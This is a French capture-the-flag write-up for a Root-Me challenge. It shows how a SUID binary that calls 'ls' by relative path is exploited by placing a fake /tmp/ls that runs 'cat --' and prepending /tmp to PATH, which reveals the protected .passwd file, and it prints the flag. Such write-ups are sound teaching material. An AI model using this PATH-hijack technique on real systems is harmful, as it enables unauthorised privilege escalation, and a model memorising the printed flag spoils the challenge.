## Source et énoncé du CTF

<https://www.root-me.org/fr/Challenges/App-Script/ELF32-System-2>

## Write-up

Ce challenge est très similaire au challenge [*Bash - System 1*](https://cybersec-handbook.hashnode.dev/root-me-pwn-bash-system-1). 

Le but du CTF est d'exploiter le binaire *ch12* pour lire le contenu du fichier */challenge/app-script/ch12/.passwd* contenant le flag.

Le code source en langage C du programme *ch12.c* est donné ci-dessous :

```console
    #include <stdlib.h>
    #include <stdio.h>
    #include <unistd.h>
    #include <sys/types.h>
     
    int main(){
        setreuid(geteuid(), geteuid());
        system("ls -lA /challenge/app-script/ch12/.passwd");
        return 0;
    }
```

On remarque une chose : 
* Le binaire utilise la commande *ls* sans utiliser son chemin absolu (faille potentielle)

Une fois compilé, le programme *ch12.c* produit le binaire *ch12*

En listant les fichiers du répertoire de travail, on obtient les droits suivants :
```console
app-script-ch12@challenge02:~$ ls -la
total 32
dr-xr-x---  2 app-script-ch12-cracked app-script-ch12         4096 Dec 10  2021 .
drwxr-xr-x 25 root                    root                    4096 Sep  5  2023 ..
-r--------  1 root                    root                     640 Dec 10  2021 ._perms
-rw-r-----  1 root                    root                      43 Dec 10  2021 .git
-r--r-----  1 app-script-ch12-cracked app-script-ch12-cracked   14 Dec 10  2021 .passwd
-rwsr-x---  1 app-script-ch12-cracked app-script-ch12         7252 Dec 10  2021 ch12
-r--r-----  1 app-script-ch12         app-script-ch12          204 Dec 10  2021 ch12.c
```

On remarque deux choses :
* Le fichier *.passwd* n'est accessible en lecture que par l'utilisateur *app-script-ch12-cracked*
* Le SUID Bit est positionné sur le fichier binaire *ch11*, et on se rappel que ce droit permet à tout utilisateur d'exécuter le fichier avec les droits de l'utilisateur propriétaire du fichier, c'est à dire avec les droits de *app-script-ch12-cracked*.

En exécutant le binaire *ch12*, on confirme que son contenu correspond au code source fourni :
```console
app-script-ch12@challenge02:~$ ./ch12
-r--r----- 1 app-script-ch12-cracked app-script-ch12-cracked 14 Dec 10  2021 /challenge/app-script/ch12/.passwd
```

On en déduit que le binaire *ch12* sera le vecteur pour afficher le contenu du fichier *.passwd* puisqu'il permet à l'utilisateur *app-script-ch12* d'exécuter une commande en tant que l'utilisateur *app-script-ch12-cracked*. Le problème étant que la commande exécutée (définie dans *ch12.c*) n'est pas *cat* mais *ls* et que cette commande est exécutée avec les arguments *-lA* propres à la commande *ls* (c'est à dire que *cat* ne les connait pas).

On a donc deux problèmes à résoudre : 
* Premièrement, on doit trouver un moyen permettant de faire en sorte que la commande *ls* exécute le binaire */bin/cat* au lieu du binaire */bin/ls*. Pour cela, on appelle le binaire */bin/cat* dans un fichier que l'on créer, que l'on nomme *ls* et que l'on stock dans un répertoire pour lequel on a les droits en écriture (par exemple */tmp*) :
Ainsi, le contenu du fichier */tmp/ls* sera le suivant :
```console
app-script-ch12@challenge02:~$ vi /tmp/ls
```
```console
#!/bin/cat
```
* Deuxièmement, on doit faire en sorte que le binaire */bin/cat* qui sera exécuté s'exécute en échappant les arguments *-lA* présents dans le code sources du programme *ch12*. Pour cela, on utilise l'option Bash ***--*** qui indique à la commande de traiter tout ce qui suit comme des arguments, y compris les options de commandes. Ainsi, la commande suivante tentera d'afficher le contenu de deux fichiers *-lA* et */challenge/app-script/ch12/.passwd* :
```console
cat -- -lA /challenge/app-script/ch12/.passwd
```

Ainsi, le contenu du fichier */tmp/ls* sera le suivant :
```console
app-script-ch12@challenge02:~$ vi /tmp/ls
```
```console
#!/bin/cat --
```

Ensuite, nous devons modifier le PATH de façon à ce que le système recherche le binaire *ls* prioritairement dans le répertoire */tmp* plutôt que dans le répertoire */bin*. On rappel que le système parse le PATH dans l'ordre de défintion des répertoires :
```console
app-script-ch12@challenge02:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/

app-script-ch12@challenge02:~$ PATH=/tmp:$PATH
app-script-ch12@challenge02:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
```

On peut enfin exécuter le binaire *ch12* pour afficher le contenu du fichier *.passwd* et obtenir le flag :
```console
app-script-ch12@challenge02:~$ ./ch12
#!/bin/cat --
/bin/cat: -lA: No such file or directory
8a95eDS/*e_T#
```

## Flag

8a95eDS/*e_T#